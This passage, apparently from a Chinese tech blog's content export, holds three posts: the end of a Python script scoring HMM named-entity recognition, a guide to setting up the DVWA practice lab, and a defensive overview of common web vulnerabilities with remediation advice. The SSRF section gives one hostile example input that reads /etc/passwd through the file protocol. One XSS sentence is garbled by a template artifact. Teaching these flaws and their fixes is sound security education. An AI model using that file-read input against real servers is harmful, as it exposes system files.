<span class="hljs-string">&#x27;M-RACE&#x27;</span>, <span class="hljs-string">&#x27;E-RACE&#x27;</span>, <span class="hljs-string">&#x27;S-RACE&#x27;</span><br>, <span class="hljs-string">&#x27;B-PRO&#x27;</span>, <span class="hljs-string">&#x27;M-PRO&#x27;</span>, <span class="hljs-string">&#x27;E-PRO&#x27;</span>, <span class="hljs-string">&#x27;S-PRO&#x27;</span><br>, <span class="hljs-string">&#x27;B-LOC&#x27;</span>, <span class="hljs-string">&#x27;M-LOC&#x27;</span>, <span class="hljs-string">&#x27;E-LOC&#x27;</span>, <span class="hljs-string">&#x27;S-LOC&#x27;</span><br>]<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">check</span>(<span class="hljs-params">language, gold_path, my_path</span>):<br>    <span class="hljs-keyword">if</span> language == <span class="hljs-string">&quot;English&quot;</span>:<br>        sort_labels = sorted_labels_eng<br>    <span class="hljs-keyword">else</span>:<br>        sort_labels = sorted_labels_chn<br>    y_true = []<br>    y_pred = []<br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(gold_path, <span class="hljs-string">&quot;r&quot;</span>, encoding=<span class="hljs-string">&quot;utf-8&quot;</span>) <span class="hljs-keyword">as</span> g_f, <span class="hljs-built_in">open</span>(my_path, <span class="hljs-string">&quot;r&quot;</span>, encoding=<span class="hljs-string">&quot;utf-8&quot;</span>) <span class="hljs-keyword">as</span> m_f:<br>        g_lines = g_f.readlines()<br>        m_lines = m_f.readlines()<br>        <span class="hljs-keyword">assert</span> <span class="hljs-built_in">len</span>(g_lines) == <span class="hljs-built_in">len</span>(m_lines), <span class="hljs-string">&quot;Length is Not Equal.&quot;</span><br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(g_lines)):<br>            <span class="hljs-keyword">if</span> g_lines[i] == <span class="hljs-string">&quot;\n&quot;</span>:<br>                <span class="hljs-keyword">continue</span><br>            g_word, g_tag = g_lines[i].strip().split(<span class="hljs-string">&quot; &quot;</span>)<br>            m_word, m_tag = m_lines[i].strip().split(<span class="hljs-string">&quot; &quot;</span>)<br>            y_true.append(g_tag)<br>            y_pred.append(m_tag)<br>    <span class="hljs-built_in">print</span>(metrics.classification_report(<br>        y_true = y_true, y_pred=y_pred, labels=sort_labels[<span class="hljs-number">1</span>:], digits=<span class="hljs-number">4</span><br>    ))<br>    <span class="hljs-keyword">return</span><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    check(language = <span class="hljs-string">&quot;Chinese&quot;</span>, gold_path=<span class="hljs-string">&quot;Project2/NER/Chinese/validation.txt&quot;</span>, my_path=<span class="hljs-string">&quot;my_pred_Chinese.txt&quot;</span>)<br>    <span class="hljs-comment">#check(language = &quot;Chinese&quot;, gold_path=&quot;Project2/NER/English/validation.txt&quot;, my_path=&quot;my_pred_English.txt&quot;)</span><br></code></pre></td></tr></table></figure><h3 id="测试结果"><a href="#测试结果" class="headerlink" title="测试结果"></a>测试结果</h3><p>中文集结果，f1-score：0.8719：</p><p><img src="/2023/05/09/HMM%E5%AE%9E%E7%8E%B0%E5%91%BD%E5%90%8D%E5%AE%9E%E4%BD%93%E8%AF%86%E5%88%AB%EF%BC%88NER%EF%BC%89%E4%BB%BB%E5%8A%A1/2.png" alt="image.png"></p><p>英文集结果，f1-score：0.6440</p><p><img src="/2023/05/09/HMM%E5%AE%9E%E7%8E%B0%E5%91%BD%E5%90%8D%E5%AE%9E%E4%BD%93%E8%AF%86%E5%88%AB%EF%BC%88NER%EF%BC%89%E4%BB%BB%E5%8A%A1/3.png" alt="image.png"></p><h1 id="我的代码"><a href="#我的代码" class="headerlink" title="我的代码"></a>我的代码</h1><p>完整代码和数据集我都放在github了，附上链接：<br><a href="https://github.com/shanjuKe001/HMM_NER/tree/master">https://github.com/shanjuKe001/HMM_NER&#x2F;tree&#x2F;master</a></p><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><p><a href="https://baike.baidu.com/item/%E9%9A%90%E9%A9%AC%E5%B0%94%E5%8F%AF%E5%A4%AB%E6%A8%A1%E5%9E%8B/7932524">百度百科-隐马尔可夫模型</a></p><p><a href="https://zhuanlan.zhihu.com/p/29938926">隐马尔科夫模型HMM</a></p><p><a href="https://blog.csdn.net/qq_45556665/article/details/127257452">隐马尔可夫模型(HMM)实现命名实体识别(NER)</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>DVWA靶场搭建</title>
    <link href="/2023/05/07/DVWA%E9%9D%B6%E5%9C%BA%E6%90%AD%E5%BB%BA/"/>
    <url>/2023/05/07/DVWA%E9%9D%B6%E5%9C%BA%E6%90%AD%E5%BB%BA/</url>
    
    <content type="html"><![CDATA[<h1 id="认识DVWA靶场"><a href="#认识DVWA靶场" class="headerlink" title="认识DVWA靶场"></a>认识DVWA靶场</h1><p>DVWA(Dame Vulnerable Web Application)是一个极易受到攻击的PHP&#x2F;MySQL Web应用程序。它的主要目标是帮助安全专业人员在法律环境中测试他们的技能和工具，帮助Web开发人员更好地了解保护Web应用程序的过程，并帮助了解Web应用程序安全性房间环境。</p><p>DMWA的目的是通过简单明了的界面<strong>练习一些最常见的Web漏洞，难度各不相同。</strong>DVWA 一共包含了十个攻击模块，分别是：Brute Force（暴力（破解））、Command Injection（命令行注入）、CSRF（跨站请求伪造）、- File Inclusion（文件包含）、File Upload（文件上传）、Insecure CAPTCHA （不安全的验证码）、SQL Injection（SQL注入）、SQL Injection（Blind）（SQL盲注）、XSS（Reflected）（反射型跨站脚本）、XSS（Stored）（存储型跨站脚本）。包含了 OWASP TOP10 的所有攻击漏洞的练习环境，一站式解决所有 Web 渗透的学习环境。</p><p>另外，DVWA 还可以手动调整靶机源码的安全级别，分别为 Low，Medium，High，Impossible，级别越高，安全防护越严格，渗透难度越大。一般 Low 级别基本没有做防护或者只是最简单的防护，很容易就能够渗透成功；而 Medium 会使用到一些非常粗糙的防护，需要使用者懂得如何去绕过防护措施；High 级别的防护则会大大提高防护级别，一般 High 级别的防护需要经验非常丰富才能成功渗透；最后 Impossible 基本是不可能渗透成功的，所以 <strong>Impossible 的源码一般可以被参考作为生产环境 Web 防护的最佳手段。</strong></p><h1 id="靶场搭建"><a href="#靶场搭建" class="headerlink" title="靶场搭建"></a>靶场搭建</h1><h2 id="安装phpStudy"><a href="#安装phpStudy" class="headerlink" title="安装phpStudy"></a>安装phpStudy</h2><p>DVWA是由PHP代码开发的，所以需要先搭建PHP运行环境。我也是按照网上教程，采用phpStudy进行环境搭建，其集成了最新的Apache和PHP等程序，并且还自带phpMyadmin的管理工具和MySQL数据库，使用非常方便。</p><p>下载地址：<a href="https://www.xp.cn/">https://www.xp.cn/</a></p><p>可以自行选择操作系统版本进行安装，安装过程非常简单，就不做介绍。安装后界面如下：<br><img src="/2023/05/07/DVWA%E9%9D%B6%E5%9C%BA%E6%90%AD%E5%BB%BA/1.png" alt="image.png"></p><h2 id="安装和配置DVWA"><a href="#安装和配置DVWA" class="headerlink" title="安装和配置DVWA"></a>安装和配置DVWA</h2><h3 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h3><p>这里我们直接从Github下载，下载地址：<a href="https://github.com/digininja/DVWA">https://github.com/digininja/DVWA</a>。<br><img src="/2023/05/07/DVWA%E9%9D%B6%E5%9C%BA%E6%90%AD%E5%BB%BA/2.png" alt="image.png"></p><h3 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h3><ol><li>将下载完成的.zip文件解压到phpstudy的WWW目录下，同时为了方便，重命名为DVWA。</li></ol><p><img src="/2023/05/07/DVWA%E9%9D%B6%E5%9C%BA%E6%90%AD%E5%BB%BA/3.png" alt="image.png"></p><ol start="2"><li>进入DVWA的config文件夹，删除config.inc.php.disc的后缀 .disc，然后对配置进行一些修改。当然我的建议是copy一份进行修改。</li></ol><p><img src="/2023/05/07/DVWA%E9%9D%B6%E5%9C%BA%E6%90%AD%E5%BB%BA/4.png" alt="image.png"></p><ol start="3"><li>使用编辑器打开config.inc.php，需要将db_user和db_password修改为对应的数据库用户名和密码，可以在phpstudy中查询，默认用户和密码都是root，也可以自己修改密码。</li></ol><p><img src="/2023/05/07/DVWA%E9%9D%B6%E5%9C%BA%E6%90%AD%E5%BB%BA/5.png" alt="image.png"><br><img src="/2023/05/07/DVWA%E9%9D%B6%E5%9C%BA%E6%90%AD%E5%BB%BA/6.png" alt="image.png"><br>修改后，保存并退出。</p><ol start="4"><li>在phpstudy中打开Apache和MySQL，浏览器访问<a href="http://127.0.0.1/DVWA/login.php">http://127.0.0.1/DVWA/login.php</a>，进入用户登录页面。默认账号为“admin”，密码是“password”。</li></ol><p><img src="/2023/05/07/DVWA%E9%9D%B6%E5%9C%BA%E6%90%AD%E5%BB%BA/7.png" alt="image.png"><br><img src="/2023/05/07/DVWA%E9%9D%B6%E5%9C%BA%E6%90%AD%E5%BB%BA/8.png" alt="image.png"></p><ol start="5"><li>进入到页面后，选择左侧的Setup&#x2F;Reset DB,滑到最下面，点击Create&#x2F;Reset Database.结束之后就可以正常使用啦。</li></ol><p><img src="/2023/05/07/DVWA%E9%9D%B6%E5%9C%BA%E6%90%AD%E5%BB%BA/9.png" alt="image.png"><br><img src="/2023/05/07/DVWA%E9%9D%B6%E5%9C%BA%E6%90%AD%E5%BB%BA/10.png" alt="image.png"></p><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a href="https://blog.csdn.net/weixin_42248871/article/details/115359443">https://blog.csdn.net/weixin_42248871&#x2F;article&#x2F;details&#x2F;115359443</a><br><a href="https://zhuanlan.zhihu.com/p/565879631">https://zhuanlan.zhihu.com/p/565879631</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>DVWA</tag>
      
      <tag>渗透测试</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>web常见漏洞知识整理</title>
    <link href="/2023/05/06/web%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E7%9F%A5%E8%AF%86%E6%95%B4%E7%90%86/"/>
    <url>/2023/05/06/web%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E7%9F%A5%E8%AF%86%E6%95%B4%E7%90%86/</url>
    
    <content type="html"><![CDATA[<h1 id="Web常见漏洞知识整理"><a href="#Web常见漏洞知识整理" class="headerlink" title="Web常见漏洞知识整理"></a>Web常见漏洞知识整理</h1><p>漏洞或脆弱性（Vulnerability），是指计算机系统安全方面的缺陷，使得系统或其应用数据的保密性、完整性、可用性、访问控制等面临威胁。<br>就结果来说，只要能给厂商带来损失的全都是漏洞。<br>本文覆盖了常见的Web漏洞，包括漏洞描述、应用场景、漏洞危害和修复建议，内容均是从互联网整理、摘录而来，仅是作为学习和备份，如有侵权请联系作者删除。</p><h2 id="十大Web应用程序安全风险（2021）"><a href="#十大Web应用程序安全风险（2021）" class="headerlink" title="十大Web应用程序安全风险（2021）"></a>十大Web应用程序安全风险（2021）</h2><p><img src="/2023/05/06/web%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E7%9F%A5%E8%AF%86%E6%95%B4%E7%90%86/owasp%20top%2010.png" alt="image.png"><br>A01:2021-Broken Access Control从第五位上移；94% 的应用程序都针对某种形式的损坏访问控制进行了测试。映射到损坏的访问控制的 34 个常见弱点枚举 (CWE) 在应用程序中的出现次数比任何其他类别都多。<br>A02:2021-Cryptographic Failures上升一位到第 2 位，以前称为敏感数据泄露，这是一个广泛的症状而不是根本原因。这里重新关注与密码学相关的故障，这些故障通常会导致敏感数据泄露或系统受损。<br>A03:2021-注射滑到第三个位置。94% 的应用程序针对某种形式的注入进行了测试，映射到该类别的 33 个 CWE 在应用程序中出现次数第二多。跨站点脚本现在是此版本中此类别的一部分。<br>A04:2021-Insecure Design是 2021 年的一个新类别，重点关注与设计缺陷相关的风险。如果我们真的想作为一个行业“向左移动”，就需要更多地使用威胁建模、安全设计模式和原则以及参考架构。<br>A05:2021-安全配置错误从上一版的#6 上移；90% 的应用程序都针对某种形式的错误配置进行了测试。随着越来越多的人转向高度可配置的软件，看到这一类别上升也就不足为奇了。以前的 XML 外部实体 (XXE) 类别现在属于此类别。<br>A06:2021-Vulnerable and Outdated Components之前的标题是使用具有已知漏洞的组件，在 Top 10 社区调查中排名第二，但也有足够的数据通过数据分析进入前 10 名。此类别从 2017 年的第 9 位上升，是我们努力测试和评估风险的已知问题。它是唯一没有将任何常见漏洞和暴露 (CVE) 映射到包含的 CWE 的类别，因此默认的漏洞利用和影响权重 5.0 被计入其分数。<br>A07:2021-Identification and Authentication Failures之前是Broken Authentication，从第二的位置往下滑，现在包括了更多与身份验证失败相关的CWEs。该类别仍然是前 10 名中不可或缺的一部分，但标准化框架的可用性增加似乎有所帮助。<br>A08:2021-Software and Data Integrity Failures是 2021 年的新类别，专注于在不验证完整性的情况下做出与软件更新、关键数据和 CI&#x2F;CD 管道相关的假设。Common Vulnerability and Exposures&#x2F;Common Vulnerability Scoring System (CVE&#x2F;CVSS) 数据映射到此类别的 10 个 CWE 的最高权重影响之一。2017 年的不安全反序列化现在是这个更大类别的一部分。<br>A09:2021-Security Logging and Monitoring Failures以前是 Insufficient Logging &amp; Monitoring，是从行业调查 (#3) 中添加的，从之前的 #10 上升。此类别已扩展以包括更多类型的故障，测试起来具有挑战性，并且在 CVE&#x2F;CVSS 数据中没有得到很好的体现。但是，此类故障会直接影响可见性、事件警报和取证。<br>A10:2021-Server-Side Request Forgery是从 Top 10 社区调查（#1）中添加的。数据显示发生率相对较低，测试覆盖率高于平均水平，以及利用和影响潜力的评级高于平均水平。此类别代表安全社区成员告诉我们这很重要的场景，即使此时数据中未说明这一点</p><h2 id="常见Web漏洞产生原因"><a href="#常见Web漏洞产生原因" class="headerlink" title="常见Web漏洞产生原因"></a>常见Web漏洞产生原因</h2><h3 id="2-1-SQL注入漏洞"><a href="#2-1-SQL注入漏洞" class="headerlink" title="2.1 SQL注入漏洞"></a>2.1 SQL注入漏洞</h3><h4 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h4><p>SQL注入漏洞产生的原因是网站应用程序在编写时未对用户提交至服务器的数据进行合法性校验（类型、长度、业务参数合法性等），同时没有对用户输入数据进行有效地特殊字符过滤，使得用户的输入直接带入数据库执行，超出了SQL语句原来设计的预期结果，导致了SQL注入漏洞。</p><h4 id="常见应用场景"><a href="#常见应用场景" class="headerlink" title="常见应用场景"></a>常见应用场景</h4><p>SQL注入漏洞可能出现在一切与数据库交互的地方，比如常见的查询用户信息、查询订单信息等查询处；搜索、筛选、过滤等；更新用户信息、添加备注等。另外，其他日志记录、分析等处也可能出现，比如记录用户登录处，记录用户登录日志处；比如常见的请求头中的字段，UA、XFF等。</p><h4 id="漏洞危害"><a href="#漏洞危害" class="headerlink" title="漏洞危害"></a>漏洞危害</h4><ol><li><p>获取数据库访问权限，甚至获得DBA权限；</p><blockquote><p>DBA权限指的是数据库管理员（Database Administrator）的权限，它是Oracle数据库中最高级别的权限。拥有DBA权限的用户可以对数据库进行完全的控制和管理，包括创建、修改和删除数据库对象、备份和恢复数据库、监视和优化数据库性能等。由于DBA权限具有极高的风险，因此通常只有经过严格审批和授权的管理员才能拥有这种权限。</p></blockquote></li><li><p>获取其他数据库中的数据；</p></li><li><p>盗取用户机密信息，包括账户、个人私密信息、交易信息等；</p></li><li><p>运行各种操作系统命令；</p></li><li><p>通过构造特殊数据库查询语句，可操作数据库进入后台并插入木马，以获取整个网站和数据库的控制权限；</p></li><li><p>篡改、删除网站页面；</p></li><li><p>数据库所在服务器被攻击而变成傀儡主机，甚至可能导致局域网（内网）被入侵。</p></li></ol><h4 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h4><h5 id="代码层面"><a href="#代码层面" class="headerlink" title="代码层面"></a>代码层面</h5><ol><li>输入验证：<ol><li>类型判断：字符型、整型；</li><li>长度判断：设置最大长度值；</li><li>业务参数合法性判断：比如支付金额不可能为负值；</li><li>特殊字符串过滤：比如’，”，\，&lt;，&gt;，&amp;，*，;，#，select，from，where，sub，if，union，sleep，and，or等；</li><li>验证所有输入点，包括UA，Cookie以及其他HTTP头。</li></ol></li><li>预编译处理&amp;参数化查询</li></ol><p>所有与数据库交互的业务接口均采用参数化查询，参数化的语句使用参数而不是将用户变量嵌入到SQL语句中，参数化查询是防御SQL注入的最佳方法，比如：Java中的PreparedStatement，PHP中的PDO等。</p><h5 id="数据库层面"><a href="#数据库层面" class="headerlink" title="数据库层面"></a>数据库层面</h5><ol><li><p>最小权限原则</p><p>  遵循最小化权限原则，严格限制网站用户的数据库操作权限，禁止将任何高权限账户（SA，DBA，root等）用于应用程序数据库访问，从而最大限度的减少注入攻击对数据库的危害。</p></li><li><p>禁用敏感函数</p></li></ol><p>比如MSSQL（Microsoft SQL Server）中，拒绝用户访问敏感的系统存储过程，如xp_dirtree,xp_cmdshell等。</p><ol start="3"><li><p>权限控制</p><p>  限制用户所能访问到的数据库表。</p></li><li><p>编码统一</p></li></ol><p>网站与数据库的编码统一，建议全部使用UTF-8编码，避免因上下层编码不一致导致一些过滤模型被绕过，比如宽字节注入等。</p><h5 id="其他措施"><a href="#其他措施" class="headerlink" title="其他措施"></a>其他措施</h5><ol><li>避免网站异常抛出SQL错误信息，比如类型错误、字段不匹配等，防止攻击者利用这些错误信息进行一些判断；</li><li>使用通用防注入系统。</li></ol><h3 id="2-2-XSS（跨站脚本漏洞）"><a href="#2-2-XSS（跨站脚本漏洞）" class="headerlink" title="2.2 XSS（跨站脚本漏洞）"></a>2.2 XSS（跨站脚本漏洞）</h3><h4 id="漏洞描述-1"><a href="#漏洞描述-1" class="headerlink" title="漏洞描述"></a>漏洞描述</h4><p>XSS全称为Cross Site Scripting，为了和CSS分开简写为XSS，中文名为跨站脚本。该漏洞发生在用户端，是指恶意攻击者往Web站点里插入恶意脚本代码，当用户浏览该网站时，嵌入其里面的脚本代码会被执行，从而达到恶意用户的特殊目的。<br>根据是否写入数据看来分类主要有反射性和存储型两大类。</p><ul><li>反射型跨站脚本（Reflected XSS）</li><li>储存型跨站脚本（Persistent XSS）</li></ul><p>区别：存储型XSS的恶意代码存在数据库里，反射型XSS的恶意代码存在URL里。</p><h4 id="常见应用场景-1"><a href="#常见应用场景-1" class="headerlink" title="常见应用场景"></a>常见应用场景</h4><h5 id="反射型XSS"><a href="#反射型XSS" class="headerlink" title="反射型XSS"></a>反射型XSS</h5><p>反射型XSS通常需要被攻击者点击对应的连接才能触发，且受到XSS Auditor, NoScript等防御手段的影响较大。</p><blockquote><p>XSS Auditor和NoScript都是与网络安全相关的工具。<br>XSS Auditor是浏览器内置的一种安全机制，用于检测和防止跨站脚本攻击（XSS）。当浏览器检测到网站中存在可能导致XSS攻击的代码时，会自动禁用该代码或者阻止该网站的加载。<br>NoScript是一款浏览器插件，可防止恶意脚本和跨站点脚本攻击。它通过限制网站的JavaScript、Flash、Java、Silverlight等脚本语言的执行来保护用户的隐私和安全。用户可以根据自己的需求选择允许或禁止某些网站的脚本执行。</p></blockquote><pre><code class="hljs">反射型XSS应用场景：比如搜索、查询、接口调用、跳转、HTTP头获取参数地理位置、cookie、id、referer等一切输入输出的地方。</code></pre><h5 id="存储型XSS"><a href="#存储型XSS" class="headerlink" title="存储型XSS"></a>存储型XSS</h5><p>存储型XSS由于存储在数据库或其他持久性中间件中，所以用户只需浏览了包含恶意代码的页面即可在用户无感知的情况下触发。</p><h4 id="漏洞危害-1"><a href="#漏洞危害-1" class="headerlink" title="漏洞危害"></a>漏洞危害</h4><ol><li>钓鱼欺骗：最典型的就是利用目标网络的反射型跨站脚本漏洞将网站重定向到钓鱼网站，或者注入钓鱼JavaScript以监控目标网站的表单输入，甚至发起基于DHTML更高级的钓鱼攻击方式；</li><li>网站挂马：跨站后利用IFrame嵌入隐藏的恶意网站或者将被攻击者重定向到恶意网站上，或者弹出恶意网站窗口等方式都可以进行挂马攻击；</li><li>身份盗用：cookie是用于对于特定网站的身份验证标志，XSS可以盗取用户的cookie，就可以获取到用户对网站的操作权限，从而查看用户隐私信息；</li><li>用户劫持：一些高级的XSS，比如XSS蠕虫；</li><li>控制受害者机器向其他系统发起攻击。</li></ol><h4 id="修复建议-1"><a href="#修复建议-1" class="headerlink" title="修复建议"></a>修复建议</h4><h5 id="代码层面-1"><a href="#代码层面-1" class="headerlink" title="代码层面"></a>代码层面</h5><ol><li>在服务器端进行输入验证（输入验证）</li></ol><p>服务器后端进行输入验证，包括输入的数据类型、数据长度、格式及特殊字符串等进行验证。</p><ol start="2"><li>数据输出实体编码（输出编码）</li></ol><p>输出编码手段主要有3中编码：URL编码、HTML编码和JavaScript编码。</p><ul><li>JAVA：开源的ESAPI library；</li><li>框架（Spring：HtmlUtils.htmlEscape);</li><li>PHP：使用htmlspecialchars等函数进行过滤输出。</li></ul><h5 id="其他层面"><a href="#其他层面" class="headerlink" title="其他层面"></a>其他层面</h5><ol><li>使用引擎模板</li></ol><p>开启模板引擎自带的HTML转义功能。例如：在ejs中，尽量使用  &lt;%&#x3D; data %&gt; 而不是 &lt;%- data %&gt;； 在 doT.js 中，尽量使用&lt;!–swig￼3–&gt;’)”、onClick&#x3D;”go(‘‘)”这种拼接内联事件的写法。在 JavaScript 中通过 .addEventlistener()事件绑定会更安全。</p><ol start="3"><li><p>避免拼接 HTML</p><pre><code class="hljs">前端采用拼接 HTML 的方法比较危险，如果框架允许，使用 createElement、setAttribute 之类的方法实现。或者采用比较成熟的渲染框架，如 Vue/React 等。</code></pre></li><li><p>使用CSP</p></li></ol><p>Content Security Policy：禁止加载外域代码，防止复杂的攻击逻辑；禁止外域提交，网站被攻击后，用户的数据不会泄露到外域；禁止内联脚本执行；禁止未授权的脚本执行。</p><ol start="5"><li>使用httponly</li></ol><p>HTTP-only Cookie: 禁止 JavaScript 读取某些敏感 Cookie，攻击者完成 XSS 注入后也无法窃取此 Cookie。httponly无法完全的防御xss漏洞，它只是规定了不能使用js去获取cookie的内容，因此它只能防御利用xss进行cookie劫持的问题。Httponly是在set-cookie时标记的，可对单独某个参数标记也可对全部参数标记。由于设置httponly的方法比较简单，使用也很灵活，并且对防御cookie劫持非常有用，因此已经渐渐成为一种默认的标准。</p><h3 id="2-3-CSRF（跨站请求伪造）"><a href="#2-3-CSRF（跨站请求伪造）" class="headerlink" title="2.3 CSRF（跨站请求伪造）"></a>2.3 CSRF（跨站请求伪造）</h3><h4 id="漏洞描述-2"><a href="#漏洞描述-2" class="headerlink" title="漏洞描述"></a>漏洞描述</h4><p>CSRF（Cross-site request forgery）跨站请求伪造，也被称为“One Click Attack”或者Session Riding，通常缩写为CSRF，是一种对网站的恶意利用。尽管听起来像跨站脚本（XSS），但它与XSS非常不同，XSS利用站点内的信任用户，而CSRF则通过伪装来自受信任用户的请求来利用受信任的网站。攻击者通过伪造来自受信任用户的请求，达到增加、删除、篡改网站内容的目的。</p><h4 id="常见应用场景-2"><a href="#常见应用场景-2" class="headerlink" title="常见应用场景"></a>常见应用场景</h4><p>一个成功的SCRF漏洞攻击的场景，需要由三个部分构成：<br>1.　有一个没有进行二次校验措施的前台或后台的数据修改、新增、删除等数据交互请求的漏洞存在；<br>2.　伪装数据操作请求的恶意链接或者页面；<br>3.　诱使用户主动访问、点击恶意链接，触发非法操作。</p><h4 id="漏洞危害-2"><a href="#漏洞危害-2" class="headerlink" title="漏洞危害"></a>漏洞危害</h4><p>CSRF漏洞是借助受害者的cookie来进行攻击者想要的恶意操作，攻击者并不是拿到了受害者cookie，对于服务器返回的结果也无法解析查看，攻击者的攻击就是让服务器执行了自己想要的操作指令或业务流程。<br>最常见的攻击场景为：攻击者冒充用户&#x2F;管理员伪造请求，进行网页篡改；用户修改、添加用户、密码修改；发送帖子、消息等非法操作。</p><h4 id="修复建议-2"><a href="#修复建议-2" class="headerlink" title="修复建议"></a>修复建议</h4><ol><li>验证HTTP Referer字段；</li><li>关键业务操作使用图形验证码进行二次确认验，只接受 POST 请求，GET请求应只浏览而不改变服务器端资源；</li><li>过滤用户输入，不允许发布含有站内操作URL的链接；</li><li>增加csrftoken验证，csrftoken可以在用户登陆后产生并放于 session 之中，然后在每次请求时把csrftoken从 session 中拿出，与请求中的csrftoken进行比对。对于GET请求，csrftoken将附在请求地址之后，对于POST请求来说，要在form的最后加上 <input type="hidden" name="csrftoken" 　value="tokenvalue">；</li><li>在 HTTP 头中自定义属性并验证，该方法同csrftoken，同为随机值校验，但是这里并不是把csrftoken以参数的形式置于HTTP请求之中，而是把它放到 HTTP头中自定义的属性里；</li><li>在浏览其它站点前登出站点或者在浏览器会话结束后清理浏览器的cookie。</li></ol><h3 id="2-4-SSRF（服务端请求伪造）"><a href="#2-4-SSRF（服务端请求伪造）" class="headerlink" title="2.4 SSRF（服务端请求伪造）"></a>2.4 SSRF（服务端请求伪造）</h3><h4 id="漏洞描述-3"><a href="#漏洞描述-3" class="headerlink" title="漏洞描述"></a>漏洞描述</h4><p>服务端请求伪造攻击(Server-side Request Forgery):很多web应用都提供了从其他的服务器上获取数据的功能。比如获取图片、下载文件、读取文件内容等。SSRF漏洞是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。正是因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内部系统。即：利用一个可以发起网络请求的服务，当作跳板来攻击其他服务。</p><h4 id="常见应用场景-3"><a href="#常见应用场景-3" class="headerlink" title="常见应用场景"></a>常见应用场景</h4><p>SSRF场景应用场景为任意可以发起网络请求的地方，比如：</p><ul><li>下载图片、下载文件等下载处；</li><li>文件预览、图片预览等获取图片、文件内容处；</li><li>在线识图，在线文档翻译，分享，订阅等；</li><li>根据远程URL上传，静态资源图片等；</li><li>数据库的内置功能，比如mongodb的copyDatabase函数；</li><li>URL关键字中，比如：source，share，link，src，imageurl，target等</li></ul><h4 id="漏洞危害-3"><a href="#漏洞危害-3" class="headerlink" title="漏洞危害"></a>漏洞危害</h4><ol><li>内网、本地端口扫描，获取开放端口信息；</li><li>主机信息收集，web应用指纹识别，获取服务banner信息等；</li><li>根据识别出的应用针对性的发送payload攻击，例如struts2、redis、攻击内网、本地的应用程序及服务等；</li><li>穿越防火墙；</li><li>利用file等其他允许协议进行绕过攻击，比如利用file协议读取本地文件（file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd）</li></ol><h4 id="修复建议-3"><a href="#修复建议-3" class="headerlink" title="修复建议"></a>修复建议</h4><p>SSRF漏洞修复的方法可归纳为一个依次向下的流程中：</p><ol><li>解析目标URL</li></ol><p>获取scheme、host（推荐使用系统内置函数完成,避免自己使用正则提取）</p><ol start="2"><li>校验scheme</li></ol><p>检查 scheme 是否为合法 (如非特殊需求请只允许 http 和 https)</p><ol start="3"><li>获取解析IP</li></ol><p>解析 host 获取 dns 解析后的 IP 地址</p><ol start="4"><li>检测IP是否合法</li></ol><p>检查解析后的IP地址是否为外网地址或者合法IP</p><h3 id="2-5-Exec-x2F-injection（命令执行／注入）"><a href="#2-5-Exec-x2F-injection（命令执行／注入）" class="headerlink" title="2.5 Exec&#x2F;injection（命令执行／注入）"></a>2.5 Exec&#x2F;injection（命令执行／注入）</h3><h4 id="漏洞描述-4"><a href="#漏洞描述-4" class="headerlink" title="漏洞描述"></a>漏洞描述</h4><p>命令执行&#x2F;注入漏洞通常因为应用在服务器上拼接系统命令而造成的漏洞。攻击者通过提交恶意构造的参数破坏命令语句结构，从而达到执行恶意命令的目的。</p><h4 id="常见应用场景-4"><a href="#常见应用场景-4" class="headerlink" title="常见应用场景"></a>常见应用场景</h4><p>命令执行&#x2F;注入漏洞通常出现在调用外部程序完成一些功能的情景下。</p><ul><li>管理界面的配置主机名&#x2F;IP&#x2F;掩码&#x2F;网关、查看系统信息等功能处</li><li>关闭、重启等功能处</li><li>ping、nslookup等验证主机等功能处</li><li>提供发送邮件、转换图片等功能处</li></ul><h4 id="漏洞危害-4"><a href="#漏洞危害-4" class="headerlink" title="漏洞危害"></a>漏洞危害</h4><p>攻击者可在服务器通过利用拼接、管道符、通配符等绕过手段来执行任意命令，写入后门，从而入侵服务器，获取服务器权限，直接导致服务器沦陷。</p><h4 id="修复建议-4"><a href="#修复建议-4" class="headerlink" title="修复建议"></a>修复建议</h4><ol><li>在代码级调用shell时，对命令行中的特殊字符（比如|、&amp;、；等）进行转义，防止执行其他非法命令。</li><li>根据业务逻辑进行白名单方式校验或使用正则表达式进行过滤。</li><li>PHP中可使用escapeshellarg、escapeshellcmd来转义对应敏感字符。</li><li>对于相关敏感的命令执行函数，做好参数校验和合法性验证，或者直接在配置文件中禁用该函数，不要让用户可以直接控制eval、system、exec、shell_exec等函数的参数 。</li></ol><h3 id="2-6-XXE（XML实体注入）"><a href="#2-6-XXE（XML实体注入）" class="headerlink" title="2.6 XXE（XML实体注入）"></a>2.6 XXE（XML实体注入）</h3><h4 id="漏洞描述-5"><a href="#漏洞描述-5" class="headerlink" title="漏洞描述"></a>漏洞描述</h4><p>XML外部实体注入（XML External Entity Injection）漏洞是指当恶意用户在提交一个精心构造的包含外部实体引用的XML文档给未正确配置的XML解析器处理时，该攻击就会发生。</p><blockquote><p>XML 指可扩展标记语言（eXtensible Markup Language），是一种用于标记电子文件使其具有结构性的标记语言，被设计用来传输和存储数据。XML文档结构包括XML声明、DTD文档类型定义（可选）、文档元素。目前，XML文件作为配置文件（Spring、Struts2等）、文档结构说明文件（PDF、RSS等）、图片格式文件（SVG header）应用比较广泛。 XML 的语法规范由 DTD （Document Type Definition）来进行控制。</p></blockquote><h4 id="常见应用场景-5"><a 